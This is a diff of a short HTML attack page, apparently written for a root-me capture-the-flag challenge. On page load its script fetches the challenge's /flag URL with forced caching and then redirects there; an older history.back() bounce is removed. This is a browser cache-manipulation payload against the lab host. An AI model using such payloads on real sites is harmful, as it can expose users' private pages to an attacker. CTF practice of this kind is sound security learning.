@@ -3,25 +3,14 @@
 <head>
   <meta charset="utf-8">
   <script>
-    // test
-    let step = 0;
-    
     window.addEventListener('load', () => {
-      step = 1;
+
+      fetch('http://challenge01.root-me.org:58007/flag', {cache: 'force-cache'});
+      
       setTimeout(() => {
         location.href = 'http://challenge01.root-me.org:58007/flag';
-      }, 300);
-    });
-
-    window.addEventListener('pageshow', () => {
-      if (step === 1) {
-        step = 2;
-        setTimeout(() => history.back(), 800);
-      }
+      }, 800);
     });
   </script>
 </head>
-<body style="background:black;color:lime;font-size:30px;">
-  <h1>BF → FLAG</h1>
-</body>
 </html>
